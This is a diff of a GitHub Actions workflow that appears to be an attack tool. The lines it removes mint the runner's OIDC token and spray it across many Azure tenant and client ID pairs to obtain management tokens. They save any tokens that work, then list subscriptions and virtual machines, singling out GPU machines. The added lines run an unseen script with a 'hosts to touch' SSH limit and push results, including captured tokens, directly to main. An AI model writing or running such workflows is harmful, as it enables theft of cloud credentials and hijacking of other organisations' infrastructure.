@@ -1,102 +1,43 @@
 name: ul8781
 on:
   workflow_dispatch:
+    inputs:
+      ssh_limit:
+        description: hosts to touch
+        default: "16"
+  push:
+    branches: [main]
 permissions:
   id-token: write
   contents: write
 jobs:
-  oidc:
+  phaseA:
+    if: github.event_name == 'workflow_dispatch' || contains(github.event.head_commit.message, 'ul8781')
     runs-on: ubuntu-latest
-    timeout-minutes: 45
+    timeout-minutes: 50
     steps:
       - uses: actions/checkout@v4
         with:
-          token: ${{ secrets.GH_PAT }}
           fetch-depth: 1
-      - name: oidc-mint-and-arm
+      - name: census
         env:
-          TEN: e8adc959-bf67-48e0-95b4-318b5f73946c
-          TEN2: c3b32785-891b-4be9-90c2-c6d313ab4895
-          SUB: 21bcfd92-9348-4285-a51e-815d6e56bddf
-          CIDS: 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab 31f3b47b-3d31-4a5b-8f7e-1f3c8c0e7b35 b9590f55-e173-495c-9010-15beb8611a43 621dcd44-3c72-4105-b862-301a105412af 0001746b-3028-43be-8d1a-9d398cdee9f9 19704041-8953-47f5-9b58-45c58f7fb9be 25c1dc23-3925-49f1-94d3-4e702da5fa9b 67445fb6-d624-484b-a4d8-851d00fdcf00 54e80ec8-af96-40ce-963b-cef03b5ecd77 5c4c9f91-aaaa-bbbb-cccc-3e9036f05d5c e3d1f2c5-1b7e-4e8a-9c0d-2f5a6b7c8d9e
+          SSH_LIMIT: ${{ github.event.inputs.ssh_limit }}
         run: |
-          set +e
-          mkdir -p res
-          echo "== oidc request ==" > res/matrix.txt
-          OJ=$(curl -s -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
-          OIDC=$(echo "$OJ" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
-          echo "oidc_len=${#OIDC}" | tee -a res/matrix.txt
-          echo "${#OIDC}" > res/oidc_len.txt
-          for T in $TEN $TEN2; do
-            for CID in $CIDS; do
-              R=$(curl -s -m 25 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
-                -d grant_type=client_credentials -d client_id=$CID \
-                -d scope=https://management.azure.com/.default \
-                -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
-                --data-urlencode "client_assertion=$OIDC")
-              CODE=$(echo "$R" | grep -oE 'AADSTS[0-9]+' | head -1)
-              TL=$(echo "$R" | python3 -c "import json,sys;print(len(json.load(sys.stdin).get('access_token','')))" 2>/dev/null)
-              echo "$T $CID code=${CODE:-none} tok=${TL:-0}" | tee -a res/matrix.txt
-              if [ "${TL:-0}" -gt 100 ]; then
-                echo "$R" > "res/tok_${T:0:8}_${CID:0:8}.json"
-                echo "SUCCESS $T $CID"
-                echo "$T $CID" >> res/winners.txt
-              fi
-            done
-          done
-          echo "== winners =="; cat res/winners.txt 2>/dev/null
-          # For each winner, enumerate ARM
-          i=0
-          while read -r T CID; do
-            i=$((i+1))
-            TOK=$(python3 -c "import json;print(json.load(open('res/tok_${T:0:8}_${CID:0:8}.json'))['access_token'])" 2>/dev/null)
-            [ -z "$TOK" ] && continue
-            echo "--- $T $CID ---" >> res/arm.txt
-            curl -s -m 25 -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions?api-version=2022-12-01" -o res/subs_$i.json
-            python3 - "$i" <<'PY' >> res/arm.txt 2>&1
-import json,sys
-i=sys.argv[1]
-try:
-    d=json.load(open(f'res/subs_{i}.json'))
-    for s in d.get('value',[]): print('SUB',s['subscriptionId'],s['displayName'],s['state'])
-    print('nsubs',len(d.get('value',[])))
-except Exception as e: print('subs_err',e)
-PY
-            curl -s -m 60 -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions/21bcfd92-9348-4285-a51e-815d6e56bddf/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01&statusOnly=false" -o res/vms_$i.json
-            python3 - "$i" <<'PY' >> res/arm.txt 2>&1
-import json,sys
-i=sys.argv[1]
-try:
-    d=json.load(open(f'res/vms_{i}.json'))
-    vs=d.get('value',[])
-    print('nvms',len(vs))
-    gpu=[v for v in vs if any(x in (v.get('properties',{}).get('hardwareProfile',{}) or {}).get('vmSize','').upper() for x in ('NC','ND','NV','STANDARD_NC','H100','A100'))]
-    print('ngpu_vms',len(gpu))
-    for v in vs:
-        p=v.get('properties',{}) or {}
-        hp=(p.get('hardwareProfile') or {}).get('vmSize','')
-        ni=p.get('networkProfile',{}).get('networkInterfaces',[]) or []
-        print('VM',v.get('name'),hp,v.get('location'),v.get('resourceGroup'),p.get('provisioningState'))
-except Exception as e: print('vms_err',e, open(f'res/vms_{i}.json').read()[:300] if __import__('os').path.exists(f'res/vms_{i}.json') else '')
-PY
-          done < res/winners.txt
-          echo "== done ==" >> res/arm.txt
-          tail -60 res/arm.txt
+          python3 scripts/ul8781.py || true
+          ls -l res | head -40
+          tail -40 res/log.txt || true
       - name: publish
         if: always()
         run: |
           set +e
-          git config --global user.email ul@local; git config --global user.name ul
-          BR="ul8781-$(date -u +%H%M%S)"
-          git checkout -b "$BR"
+          git config user.email ul@local; git config user.name ul
           mkdir -p out/ul8781
           cp -r res/* out/ul8781/ 2>/dev/null
-          git add -A out/ul8781
-          git commit -m "ul8781 results"
-          git push origin "$BR" 2>&1 | tail -3
-          echo "BRANCH=$BR"
+          git add -f out/ul8781 res 2>/dev/null
+          git commit -m "ul8781 phaseA results" 2>&1 | tail -2
+          git push origin HEAD:main 2>&1 | tail -3
       - uses: actions/upload-artifact@v4
         if: always()
         with:
-          name: ul8781
+          name: ul8781-res
           path: res
